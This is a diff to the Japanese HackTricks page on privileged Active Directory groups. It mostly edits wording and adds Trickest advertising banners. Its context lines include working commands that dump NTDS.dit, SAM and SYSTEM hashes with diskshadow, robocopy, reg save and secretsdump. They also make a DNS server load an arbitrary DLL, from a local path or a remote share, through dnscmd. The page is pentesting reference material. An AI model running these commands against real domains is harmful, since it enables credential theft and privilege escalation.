@@ -15,6 +15,13 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
+今すぐアクセスを取得：
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
 ## 管理権限を持つよく知られたグループ
 
 * **管理者**
@@ -65,7 +72,7 @@ C:\> .\PsService.exe security AppReadiness
 ```
 このコマンドは、`Server Operators`が完全なアクセス権を持ち、特権を昇格させるためにサービスを操作できることを明らかにします。
 
-## Backup Operators
+## バックアップオペレーター
 
 `Backup Operators`グループのメンバーシップは、`SeBackup`および`SeRestore`特権により、`DC01`ファイルシステムへのアクセスを提供します。これらの特権により、明示的な権限がなくても、`FILE_FLAG_BACKUP_SEMANTICS`フラグを使用してフォルダのトラバーサル、リスト表示、およびファイルコピー機能が可能になります。このプロセスには特定のスクリプトを利用する必要があります。
 
@@ -94,7 +101,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 ```
 ### AD攻撃
 
-ドメインコントローラーのファイルシステムへの直接アクセスは、ドメインユーザーとコンピュータのすべてのNTLMハッシュを含む`NTDS.dit`データベースの盗難を可能にします。
+ドメインコントローラーのファイルシステムへの直接アクセスは、ドメインユーザーとコンピューターのすべてのNTLMハッシュを含む`NTDS.dit`データベースの盗難を可能にします。
 
 #### diskshadow.exeの使用
 
@@ -124,7 +131,7 @@ robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-4. `NTDS.dit` からすべてのハッシュを取得する:
+4. `NTDS.dit`からすべてのハッシュを取得する:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
@@ -143,7 +150,7 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 
 ## DnsAdmins
 
-**DnsAdmins**グループのメンバーは、DNSサーバー上でSYSTEM権限を持つ任意のDLLをロードするためにその権限を悪用できます。これは通常、ドメインコントローラー上でホストされています。この能力は、重大な悪用の可能性を提供します。
+**DnsAdmins**グループのメンバーは、DNSサーバー（通常はドメインコントローラー上にホストされている）でSYSTEM権限を持つ任意のDLLをロードするためにその権限を悪用できます。この能力は、重大な悪用の可能性をもたらします。
 
 DnsAdminsグループのメンバーをリストするには、次のコマンドを使用します：
 ```powershell
@@ -151,7 +158,7 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### 任意のDLLを実行する
 
-メンバーは、次のようなコマンドを使用してDNSサーバーに任意のDLL（ローカルまたはリモート共有から）をロードさせることができます:
+メンバーは、次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）をロードさせることができます:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -207,18 +214,18 @@ Firefox の Mozilla Maintenance Service は、Hyper-V 管理者によって SYST
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Note: ハードリンクの悪用は最近のWindowsアップデートで軽減されています。
+Note: ハードリンクの悪用は、最近のWindowsアップデートで軽減されています。
 
 ## 組織管理
 
-**Microsoft Exchange**が展開されている環境では、**Organization Management**という特別なグループが重要な権限を持っています。このグループは**すべてのドメインユーザーのメールボックスにアクセスする**特権を持ち、**'Microsoft Exchange Security Groups'**組織単位（OU）に対して**完全な制御**を維持しています。この制御には、特権昇格に悪用可能な**`Exchange Windows Permissions`**グループが含まれます。
+**Microsoft Exchange**が展開されている環境では、**Organization Management**という特別なグループが重要な権限を持っています。このグループは、**すべてのドメインユーザーのメールボックスにアクセスする**特権を持ち、**「Microsoft Exchange Security Groups」**組織単位（OU）に対して**完全な制御**を維持しています。この制御には、特権昇格に悪用される可能性のある**`Exchange Windows Permissions`**グループが含まれます。
 
 ### 特権の悪用とコマンド
 
 #### プリントオペレーター
 **Print Operators**グループのメンバーは、**`SeLoadDriverPrivilege`**を含むいくつかの特権を持っており、これにより**ドメインコントローラーにローカルでログオン**し、シャットダウンし、プリンターを管理することができます。これらの特権を悪用するには、特に**`SeLoadDriverPrivilege`**が昇格されていないコンテキストで表示されない場合、ユーザーアカウント制御（UAC）をバイパスする必要があります。
 
-このグループのメンバーをリストするには、次のPowerShellコマンドが使用されます：
+このグループのメンバーをリストするには、次のPowerShellコマンドを使用します:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
@@ -233,7 +240,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users
 さらにRDPを悪用するための洞察は、専用のpentestingリソースにあります。
 
 #### リモート管理ユーザー
-メンバーは**Windows Remote Management (WinRM)**を介してPCにアクセスできます。これらのメンバーの列挙は、次の方法で達成されます：
+メンバーは**Windows Remote Management (WinRM)**を介してPCにアクセスできます。これらのメンバーの列挙は、以下の方法で達成されます：
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
@@ -241,7 +248,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 **WinRM**に関連するエクスプロイト技術については、特定のドキュメントを参照する必要があります。
 
 #### サーバーオペレーター
-このグループは、ドメインコントローラー上でさまざまな構成を実行する権限を持っており、バックアップおよび復元の権限、システム時間の変更、システムのシャットダウンが含まれます。メンバーを列挙するためのコマンドは次のとおりです：
+このグループは、ドメインコントローラー上でさまざまな構成を実行する権限を持っており、バックアップおよび復元の権限、システム時間の変更、システムのシャットダウンが含まれます。メンバーを列挙するためのコマンドは次のとおりです:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -262,9 +269,16 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 * [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 * [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
+今すぐアクセスを取得：
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
 {% hint style="success" %}
-AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -272,7 +286,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
